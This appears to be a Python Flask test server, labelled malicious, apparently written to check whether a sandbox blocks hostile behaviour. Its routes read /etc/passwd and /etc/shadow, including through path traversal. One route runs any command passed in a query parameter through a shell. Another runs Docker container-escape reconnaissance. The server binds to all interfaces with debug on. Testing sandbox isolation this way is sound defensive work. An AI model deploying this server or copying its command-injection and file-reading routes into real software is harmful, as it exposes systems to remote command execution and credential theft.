#!/usr/bin/env python3
from flask import Flask, request, render_template_string
import subprocess
import os

app = Flask(__name__)

print("🔴 TESTING: Malicious web server attacks...")

@app.route('/')
def index():
    return '''
    <h1>🔴 Malicious Test Server</h1>
    <p>Testing if this server can do dangerous things...</p>
    <a href="/steal-files">Try to steal files</a><br>
    <a href="/command-injection?cmd=whoami">Try command injection</a><br>
    <a href="/host-escape">Try host escape</a>
    '''

@app.route('/steal-files')
def steal_files():
    stolen_data = {}
    
    # Try to read sensitive files
    target_files = ["/etc/passwd", "/etc/shadow", "/home", "../../../../../../etc/passwd"]
    
    for file_path in target_files:
        try:
            if os.path.exists(file_path):
                with open(file_path, 'r') as f:
                    stolen_data[file_path] = f.read()[:500]  # First 500 chars
        except Exception as e:
            stolen_data[file_path] = f"BLOCKED: {str(e)}"
    
    return f"<pre>🔴 File theft attempt results:\n{stolen_data}</pre>"

@app.route('/command-injection')
def command_injection():
    cmd = request.args.get('cmd', 'whoami')
    
    try:
        # This is what malicious servers try to do
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        output = result.stdout + result.stderr
        return f"<pre>🔴 Command execution result:\n{output}</pre>"
    except Exception as e:
        return f"<pre>✅ Command blocked: {str(e)}</pre>"

@app.route('/host-escape')
def host_escape():
    escape_attempts = []
    
    # Try various container escape techniques
    commands = [
        "cat /proc/1/cgroup",  # Check if we're in container
        "ls /var/run/docker.sock",  # Docker socket access
        "mount | grep docker",  # Docker mounts
        "ps aux | grep docker",  # Docker processes
    ]
    
    for cmd in commands:
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            escape_attempts.append(f"{cmd}: {result.stdout}")
        except Exception as e:
            escape_attempts.append(f"{cmd}: BLOCKED - {str(e)}")
    
    return f"<pre>🔴 Container escape attempts:\n" + "\n".join(escape_attempts) + "</pre>"

if __name__ == '__main__':
    print("Starting malicious test server on port 8000...")
    print("Access via: http://localhost:8001")  # Remember port mapping
    app.run(host='0.0.0.0', port=8000, debug=True)
